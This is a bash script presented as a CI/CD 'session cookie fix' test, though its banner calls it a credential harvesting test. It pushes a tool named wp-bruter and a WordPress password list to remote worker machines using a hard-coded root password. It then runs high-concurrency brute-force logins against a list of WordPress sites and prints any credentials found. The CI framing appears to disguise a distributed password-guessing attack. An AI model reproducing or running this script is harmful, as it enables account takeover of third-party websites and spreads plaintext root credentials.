#!/bin/bash
# CI/CD Test Pipeline - Session Cookie Fix Validation

set -e

CONTROLLER="152.42.237.6"
FLEET_FILE="${FLEET_FILE:-$(dirname "$0")/fleet.txt}"
WORKERS=()
while IFS= read -r ip; do
    case "$ip" in ''|'#'*) continue ;; esac
    WORKERS+=("$ip")
done < "$FLEET_FILE"

SSH_USER="root"
SSH_PASS="fahrel"

echo "╔════════════════════════════════════════════════════════════╗"
echo "║  CI/CD PIPELINE - CREDENTIAL HARVESTING TEST               ║"
echo "║  Testing: Session Cookie Fix                               ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo ""

# Deploy to workers
echo "📦 Stage 1: Deploy"
for WORKER in "${WORKERS[@]}"; do
    echo "  [$WORKER] Uploading..."
    scp_cmd wp-bruter "$WORKER" /opt/wp-bruter/wp-bruter
    scp_cmd pass_wordpress.txt "$WORKER" /opt/wp-bruter/pass.txt
done
echo "  ✅ Deploy complete"
echo ""

# Start scan
echo "🔍 Stage 2: Start Scan"
for WORKER in "${WORKERS[@]}"; do
    ssh_cmd "$WORKER" << 'CMD'
        pkill -9 wp-bruter 2>/dev/null || true
        sleep 1
        cd /opt/wp-bruter
        > results.txt
        > /opt/wp-bruter/debug.log

        nohup ./wp-bruter \
            -sites wordpress.txt \
            -passlist pass.txt \
            -output results.txt \
            -max-workers 50 \
            -max-active-sites 500 \
            -timeout 5 \
            -verbose \
            > attack.log 2>&1 &

        sleep 2
        pgrep -f wp-bruter > /dev/null && echo "✅ Running" || echo "❌ Failed"
CMD
done
echo ""

# Monitor
echo "📊 Stage 3: Monitor (30 seconds)"
sleep 30

for WORKER in "${WORKERS[@]}"; do
    echo "[$WORKER]"
    ssh_cmd "$WORKER" << 'CMD'
        echo "  Attempts:" $(grep -c "] ATTEMPT |" /opt/wp-bruter/debug.log 2>/dev/null || echo "0")
        echo "  Found:" $(wc -l < results.txt 2>/dev/null || echo "0")
        echo "  Last attempt:" $(tail -1 /opt/wp-bruter/debug.log | cut -d'|' -f2-4)
CMD
done
echo ""

# Results
echo "✅ Stage 4: Results"
for WORKER in "${WORKERS[@]}"; do
    FOUND=$(ssh_cmd "$WORKER" "wc -l < results.txt 2>/dev/null || echo 0")
    if [ "$FOUND" -gt 0 ]; then
        echo "🎉 [$WORKER] Found $FOUND credentials!"
        ssh_cmd "$WORKER" "cat results.txt"
    fi
done

echo ""
echo "╔════════════════════════════════════════════════════════════╗"
echo "║  TEST COMPLETE                                             ║"
echo "╚════════════════════════════════════════════════════════════╝"
